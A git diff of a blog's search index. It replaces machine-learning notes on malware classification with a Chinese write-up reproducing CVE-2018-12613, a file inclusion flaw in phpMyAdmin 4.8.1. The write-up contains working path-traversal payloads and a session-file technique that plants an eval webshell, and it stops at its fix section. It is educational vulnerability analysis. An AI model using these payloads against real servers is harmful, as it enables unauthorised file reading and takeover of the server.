@@ -1,128 +1,574 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-  
-    
-    <entry>
-      <title>机器学习——分类问题</title>
-      <link href="/blog/2021/01/20/MachineLearning1/"/>
-      <url>/blog/2021/01/20/MachineLearning1/</url>
-      
-        <content type="html"><![CDATA[<p>​    近期，准备通过机器学习来进行恶意代码的分检，需要学习相关知识，故做了一些机器学习的笔记。</p><p>​    首先明确了这是一个典型的二分类问题，分为Malicious(恶意)和Benign(良性)两类。通过分类算法对选取的特征向量进行训练测试，实现对恶意软件和良性软件的区分。</p><a id="more"></a><h1 id="机器学习——分类问题"><a href="#机器学习——分类问题" class="headerlink" title="机器学习——分类问题"></a>机器学习——分类问题</h1><h2 id="KNN-K近邻算法"><a href="#KNN-K近邻算法" class="headerlink" title="KNN K近邻算法"></a>KNN K近邻算法</h2><h3 id="一般步骤："><a href="#一般步骤：" class="headerlink" title="一般步骤："></a>一般步骤：</h3><ol><li><p>计算距离</p><p>欧式距离</p></li><li><p>选取近邻</p><p>按距离升序，选K个样本点</p></li><li><p>分类决策</p><p>根据K个近邻归属类别，采用多数表决，由K个点来投票决定测试对象归为哪一类</p></li></ol><h3 id="关于K的取值"><a href="#关于K的取值" class="headerlink" title="关于K的取值"></a>关于K的取值</h3><p>将很大程度影响到准确率。</p><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><blockquote><p>step1</p><blockquote><p>准备数据，分析数据，预处理</p></blockquote><p>step2</p><blockquote><p>划分训练集和测试集</p></blockquote><p>step3 </p><blockquote><p>计算未知样本和训练集样本的距离</p></blockquote><p>step4</p><blockquote><p>选取K值</p></blockquote><p>step5</p><blockquote><p>多数表决</p></blockquote><blockquote><blockquote><p><strong>电影分类问题</strong>(简单问题)</p><ul><li><p>数据集</p><img src="/blog/2021/01/20/MachineLearning1/dataSet.png" style="zoom:50%;"><table><thead><tr><th align="center">FIGHT（打斗次数）</th><th align="center">KISS（接吻次数）</th><th align="center">Label（类型）</th></tr></thead><tbody><tr><td align="center">3</td><td align="center">104</td><td align="center">R</td></tr><tr><td align="center">2</td><td align="center">100</td><td align="center">R</td></tr><tr><td align="center">1</td><td align="center">81</td><td align="center">R</td></tr><tr><td align="center">101</td><td align="center">10</td><td align="center">A</td></tr><tr><td align="center">99</td><td align="center">5</td><td align="center">A</td></tr><tr><td align="center">98</td><td align="center">2</td><td align="center">A</td></tr><tr><td align="center">18</td><td align="center">90</td><td align="center">?</td></tr></tbody></table></li></ul><img src="/blog/2021/01/20/MachineLearning1/特征向量.png" style="zoom:50%;"><p>绘制特征向量关系图，以便观察。</p><p>More …</p><p><strong>约会网站配对数据</strong></p><p><em>稍复杂的数据集</em></p><ul><li><p>三个特征值</p><ol><li><p>出行里程</p></li><li><p>娱乐时间占比</p></li><li><p>每周吃冰激凌数量</p></li></ol><img src="/blog/2021/01/20/MachineLearning1/dataSet2.png" style="zoom:50%;"><p>部分数据展示，共1000行数据。    </p><p>好感度作为Label；</p><table><thead><tr><th align="center">Mileage(里程数)</th><th align="center">Entertainment(娱乐)</th><th align="center">ICE Cream(冰激凌)</th><th align="center">Impression（感官）</th></tr></thead><tbody><tr><td align="center">40920</td><td align="center">8.326976</td><td align="center">0.953952</td><td align="center">LargeDoses</td></tr><tr><td align="center">14488</td><td align="center">7.153469</td><td align="center">0.805124</td><td align="center">SmallDoses</td></tr><tr><td align="center">26052</td><td align="center">1.441871</td><td align="center">0.428964</td><td align="center">DidntLike</td></tr><tr><td align="center">…</td><td align="center">…</td><td align="center">…</td><td align="center">…</td></tr></tbody></table><p>根据特征向量关系绘图</p><ol><li><img src="/blog/2021/01/20/MachineLearning1/1.png" alt="image-20210113192420682" style="zoom:50%;"></li><li><img src="/blog/2021/01/20/MachineLearning1/2.png" alt="image-20210113192520399" style="zoom:50%;"></li><li><img src="/blog/2021/01/20/MachineLearning1/3.png" alt="image-20210113192654939" style="zoom:50%;"></li></ol></li></ul></blockquote><p><strong>归一化</strong></p><blockquote><p>欧式距离：<em>d</em>(<em>x</em>,<em>y</em>)=(<em>x</em>1−<em>y</em>1)2+(<em>x</em>2−<em>y</em>2)2+…+(<em>x**n</em>−<em>y**n</em>)2=<em>i</em>=1∑<em>n</em>(<em>x**i</em>−<em>y**i</em>)2</p><ol><li><p>0-1标准化</p><p>为了数据处理方便提出来的，把数据映射到0～1范围之内处理</p><p>公式：x’ = (x - X_min) / (X_max - X_min)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[[4.0920000e+04 8.3269760e+00 9.5395200e-01]</span><br><span class="line"> [1.4488000e+04 7.1534690e+00 1.6739040e+00]</span><br><span class="line"> [2.6052000e+04 1.4418710e+00 8.0512400e-01]</span><br><span class="line"> ...</span><br><span class="line"> [2.6575000e+04 1.0650102e+01 8.6662700e-01]</span><br><span class="line"> [4.8111000e+04 9.1345280e+00 7.2804500e-01]</span><br><span class="line"> [4.3757000e+04 7.8826010e+00 1.3324460e+00]]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[[0.44832535 0.39805139 0.56233353]</span><br><span class="line"> [0.15873259 0.34195467 0.98724416]</span><br><span class="line"> [0.28542943 0.06892523 0.47449629]</span><br><span class="line"> ...</span><br><span class="line"> [0.29115949 0.50910294 0.51079493]</span><br><span class="line"> [0.52711097 0.43665451 0.4290048 ]</span><br><span class="line"> [0.47940793 0.3768091  0.78571804]]</span><br></pre></td></tr></table></figure><p>不同特征数量级一致，权重降低，线性变化，位序不会发生变化。</p></li><li><p>Z-score标准化</p></li><li><p>sigmoid压缩法</p></li></ol></blockquote><p>继续处理这个问题</p><blockquote><ul><li><p>划分训练集和测试集</p><p>先获取总规模，按一定百分比取训练集规模</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="number">0.8</span></span><br><span class="line">dataSize = normalSet.shape[<span class="number">0</span>]</span><br><span class="line">trainSize = <span class="built_in">int</span>(m*dataSize)</span><br><span class="line">testSize = <span class="built_in">int</span>((<span class="number">1</span>-m)*dataSize)</span><br></pre></td></tr></table></figure></li><li><p>KNN算法</p><p>取K = 5；</p><p>数据集总行数 1000<br>错误率 : 0.05527638190954774</p><p>K = 6;</p><p>错误率 : 0.06030150753768844</p><p>…</p><table><thead><tr><th align="center">划分比例（训练：测试）</th><th align="center">K</th><th align="center">准确率</th></tr></thead><tbody><tr><td align="center">8：2</td><td align="center">5</td><td align="center">99.45%</td></tr><tr><td align="center">8：2</td><td align="center">6</td><td align="center">99.44%</td></tr><tr><td align="center">7：3</td><td align="center">6</td><td align="center">99.96%</td></tr><tr><td align="center">6：4</td><td align="center">6</td><td align="center">99.96%</td></tr></tbody></table></li></ul></blockquote></blockquote></blockquote><h1 id="敏感权限"><a href="#敏感权限" class="headerlink" title="敏感权限"></a>敏感权限</h1><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><img src="/blog/2021/01/20/MachineLearning1/algorithm.png" alt="image-20210113225521492" style="zoom: 50%;"><h3 id="权限特征"><a href="#权限特征" class="headerlink" title="权限特征"></a>权限特征</h3><h3 id="理论研究"><a href="#理论研究" class="headerlink" title="理论研究"></a>理论研究</h3><p>通过反编译、解压缩等多种途径即可获得应用程序的权限信息，再利用系统权限的调用能够间接反映出应用程序行为特征的特性，将系统权限申请与恶意应用的行为对应上，达到分类的目标和效果。</p><h3 id="KNN"><a href="#KNN" class="headerlink" title="KNN"></a>KNN</h3><blockquote><p><strong>Details</strong></p><blockquote><p>Pandas</p><ul><li><p>iloc</p><p>根据数字型的行/列标签来索引数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X &#x3D; trainData.iloc[:4000,0:88]</span><br><span class="line">Y &#x3D; testData.iloc[:2000,:88]</span><br></pre></td></tr></table></figure></li><li><p>K值</p><p>500</p><table><thead><tr><th align="center">K</th><th align="center">P</th></tr></thead><tbody><tr><td align="center">500</td><td align="center">99.82400</td></tr><tr><td align="center">100</td><td align="center">99.82400</td></tr><tr><td align="center">2000</td><td align="center">99.82400</td></tr></tbody></table><p>欧式距离情况下，K个label全都是0</p></li></ul></blockquote></blockquote><h3 id="随机森林"><a href="#随机森林" class="headerlink" title="随机森林"></a>随机森林</h3><blockquote><p><strong>决策树</strong></p><blockquote><p><strong>决策树是一种有监督的机器学习算法，该方法可以用于解决分类和回归问题。决策树可以简单地理解为达到某一特定结果的一系列决策。</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;class sklearn.ensemble.RandomForestClassifier(n_estimators&#x3D;10, criterion&#x3D;&#39;gini&#39;, max_depth&#x3D;None, min_samples_split&#x3D;2, min_samples_leaf&#x3D;1, min_weight_fraction_leaf&#x3D;0.0, max_features&#x3D;’auto’, max_leaf_nodes&#x3D;None, min_impurity_decrease&#x3D;0.0, min_impurity_split&#x3D;None, bootstrap&#x3D;True, oob_score&#x3D;False, n_jobs&#x3D;1, random_state&#x3D;None, verbose&#x3D;0, warm_start&#x3D;False, class_weight&#x3D;None)</span><br></pre></td></tr></table></figure><ul><li><strong>n_estimators</strong> : integer, optional (default=10)  整数，可选择(默认值为10)。</li></ul><blockquote><p>The number of trees in the forest.  </p><p> 森林里（决策）树的数目。</p></blockquote><ul><li></li></ul></blockquote><p>显示算法，没有训练，而是作比较。</p>]]></content>
-      
-      
+<search>
+  <entry>
+    <title>文件包含漏洞（一）</title>
+    <url>/blog/2019/08/27/FI20210127/</url>
+    <content><![CDATA[<blockquote>
+<p>在包含文件时候，为了灵活包含文件，将被包含文件设置为变量，用来动态调用。但通过动态变量的方式引入需要包含的文件时，用户对变量的值可控而服务器端又未对变量值进行合理地校验或者校验被绕过，因此导致了文件包含漏洞。</p>
+</blockquote>
+<a id="more"></a>
+
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>&emsp;程序开发人员一般会把重复使用的函数写到单个文件中,需要使用某个函数时直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为文件包含。通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来,就会导致文件信息的泄露甚至注入了恶意代码。</p>
+<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>PHP中常见的包含文件函数</p>
+<ul>
+<li><p>include()</p>
+<p>使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含<br>进来，发生错误时之给出一个警告，继续向下执行。</p>
+</li>
+<li><p>include_one()</p>
+<p>功能与Include()相同，区别在于当重复调用同一文件时，程序只调用一次</p>
+</li>
+<li><p>require()</p>
+<p>require()与include()的区别在于require()执行如果发生错误，函数会输出<br>错误信息，并终止脚本的运行。</p>
+</li>
+<li><p>require_once()</p>
+<p>与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
+</li>
+</ul>
+<h3 id="危险配置"><a href="#危险配置" class="headerlink" title="危险配置"></a>危险配置</h3><p><strong>RFI</strong> 远程文件包含相关配置</p>
+<p>allow_url_fopen</p>
+<p>allow_url_include</p>
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>在PHP中</p>
+<ul>
+<li><p><code>php://input</code></p>
+<p>获取post数据，可以用来写木马</p>
+</li>
+<li><p><code>php://filter</code></p>
+<p>经常利用它进行base64编码，读取源代码</p>
+</li>
+<li><p><code>file://</code></p>
+<p>访问本地文件系统，必须用绝对路径</p>
+</li>
+<li><p><code>data://</code></p>
+<p>传输数据</p>
+</li>
+<li><p><code>phar://</code></p>
+<p>解压缩</p>
+</li>
+</ul>
+<p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\1678972-20200503145841452-2005716470.png" alt="img"></p>
+<p>（图片来自<a href="https://www.cnblogs.com/Lee-404/p/12821986.html%EF%BC%89">https://www.cnblogs.com/Lee-404/p/12821986.html）</a></p>
+<h2 id="案例CVE-2018-12613-复现分析"><a href="#案例CVE-2018-12613-复现分析" class="headerlink" title="案例CVE-2018-12613 复现分析"></a>案例CVE-2018-12613 复现分析</h2><p>&emsp;phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在phpmyadmin 4.8.1 版本，index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。</p>
+<h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><p>漏洞入口如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有个文件包含，需要满足如下五个条件：</p>
+<ul>
+<li><p>$_REQUEST[‘target’] </p>
+<p><strong>$_REQUEST</strong>是PHP中的超级全局变量，接收表单提交的数据，所以这边首先要满足存在target参数</p>
+</li>
+<li><p>is_string($_REQUEST[‘target’])</p>
+<p><strong>is_string()</strong> 函数用于检测变量是否是字符串。如果指定变量为字符串，则返回 TRUE，否则返回 FALSE。所以target参数需要是一个字符串。</p>
+</li>
+<li><p>! preg_match(‘/^index/‘, $_REQUEST[‘target’])</p>
+<p>**preg_match()**用于执行正则匹配，返回匹配次数，又因为是非贪婪的匹配，所以返回值是0或1。</p>
+<p>搜索target参数中与模式相匹配字符串，并取非，即不能出现index</p>
+</li>
+<li><p>! in_array($_REQUEST[‘target’], $target_blacklist)</p>
+<p><strong>in_array()</strong> 函数搜索数组中是否存在指定的值。</p>
+<p>target对应的字符串不能出现在 $target_blacklist中</p>
+</li>
+<li><p>Core::checkPageValidity($_REQUEST[‘target’]</p>
+<p>需要满足Core类的checkPageValidity方法判断</p>
+</li>
+</ul>
+<p>前三个条件，很清晰，要求能接收到表单提交的target参数对应的数据，并且该数据是一个不包含”index”字符串的字符串。对于第四点和第五点，我们需要进一步去查看$target_blacklist和checkPageValidity方法到底是什么。</p>
+<p>首先来看一下$target_blacklist这个变量，对应index.php的第50～52行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$target_blacklist</span> = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>不难看出，这里创建了一个索引数组，也就说target不能是import.php或export.php。</p>
+<p>继续来看checkPageValidity方法，在libraries/classes/Core.php文件中的443～476行。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">        <span class="variable">$page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">    <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">        <span class="variable">$_page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此处只传了一个参数$_REQUEST[‘target’]，我们可以先定位第一个if判断，在$whitelist为空的条件下，会引用静态声明的$goto_whitelist。默认的白名单如下所示</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>这些文件都是可以被包含的。</p>
+<p>第二个if条件，判断$page是否被设置或$page是否为字符串，其中如果$page没有被设置或者$page不是字符串就会返回一个false。</p>
+<p>第三个if条件，判断$page对应的值是否在$whitelist中。</p>
+<p>第四个if条件，以？分割取出前面的字符串，再判断该值是否存在于$goto_whilelist某个数组中。这个判断的作用是在target值含有参数的情况下，phpmyadmin也能正确的包含文件。</p>
+<p>具体的来说，先要知道mb_strpos(haystack,needle)的作用是返回要查找的字符串在别一个字符串中首次出现的位置，这里haystack代表被检索字符串，needle表示需要查询的字符。</p>
+<p>再来看这一行，</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>用连接符将$page与<code>?</code>拼接，然后在其中查询<code>?</code>第一次出现的位置，这样一看可能有些奇怪，先带着这样的认知，再总体来看这一段code。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = mb_substr(</span><br><span class="line">        <span class="variable">$page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+<p>同样地，先要知道mb_substr不难看出，这是从$page中截取从位置0开始长度为mb_strpos($page . ‘?’, ‘?’)的一段字符串。而我们知道mb_strpos($page . ‘?’, ‘?’)所返回的是$page中第一个出现的<code>?</code>的位置，那么$_page最终所获取的是$page中再<code>?</code>前的所有字符。</p>
+<p>继续往下，$_page同样被判断是否在白名单中，看到这里，应该我们可以知道这里其实是phpmyadmin的开发者考虑到target值在可能带有参数的情况下，也应该被正确的包含。所以对数据进行了清洗。</p>
+<p>理解了这一边，后面其实做了类似的工作，只不过在此基础上将$page参数进行url解码再分割出<code>?</code>前的字符串判断是否包含在白名单内。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">   <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">       <span class="variable">$_page</span>,</span><br><span class="line">       <span class="number">0</span>,</span><br><span class="line">       mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">   );</span><br><span class="line">   <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据以上分析我们可以构造一个形如xxx.php?/../../../../../xxxx.php的payload传递给target参数。</p>
+<p>第一个xxx.php应该是一个可以通过白名单验证的php文件，我们可以从之前$goto_whitelist对应的数组任意挑选一个，第二个xxxx.php则是我们意图包含的文件。</p>
+<p>比如构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?target&#x3D;sql.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p>这里服务器会自动进行一次url解码，所以需要对?二次编码为%253f。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?target&#x3D;sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210126222801037.png" alt="image-20210126222801037"></p>
+<p>成功包含文件。</p>
+<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>phpmyadmin是默认会把执行的语句，记录在session文件当中的，所以可以利用包含session文件的方式来写入shell。</p>
+<p>执行SQL语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php phpinfo();?&gt;&quot;</span><br></pre></td></tr></table></figure>
+<img src="/blog/2019/08/27/FI20210127/MyBlog\source\_posts\FI20210127\image-20210127121016752.png" alt="image-20210127121016752">
+
+<p>PHP会序列化参数传递的值，并保存在本地的session文件中。查看当前phpmyadmin的cookie，并记录。</p>
+<img src="/blog/2019/08/27/FI20210127/MyBlog\source\_posts\FI20210127\image-20210127121036800.png" alt="image-20210127121036800">
+
+<p>一般情况下，phpmyadmin的session文件会设置在/tmp目录下。</p>
+<p>（如linux下默认存储在/var/lib/php/session目录）</p>
+<p>进入dokcer容器，查看<code>tmp</code>路径下的session文件。</p>
+<p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210127122045919.png" alt="image-20210127122045919"></p>
+<p>把该session文件包含进去</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?target&#x3D;sql.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_6f1f4267c65de394d87398d6ef54d893</span><br></pre></td></tr></table></figure>
+<p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210127122521211.png" alt="image-20210127122521211"></p>
+<p>我们可以看到phpinfo被解析出现。如果要继续写入webshell，从phpinfo中搜索web路径，查找<code>CONTEXT_DOCUMENT_ROOT</code>这一栏目</p>
+<p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210127122921062.png" alt="image-20210127122921062"></p>
+<p>可以看到路径为/var/www/html，构造sql语句写入webshell，如这里利用php的file_put_contents函数将一个字符串写入文件中。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php file_put_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;webshell.php&#39;,&#39;&lt;?php eval($_POST[a]);?&gt;&#39;);?&gt;&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210127123450942.png" alt="image-20210127123450942"></p>
+<p>再次包含session文件。</p>
+<p>访问webshell.php文件，发现文件存在，说明写入成功。</p>
+<p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210127123830334.png" alt="image-20210127123830334"></p>
+<p>蚁剑连接。</p>
+<p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210127133755420.png" alt="image-20210127133755420"></p>
+<img src="/blog/2019/08/27/FI20210127/MyBlog\source\_posts\FI20210127\image-20210127133823598.png" alt="image-20210127133823598" style="zoom:80%;">
+
+<p>成功Getshell。</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>参考官方的漏洞修复</p>
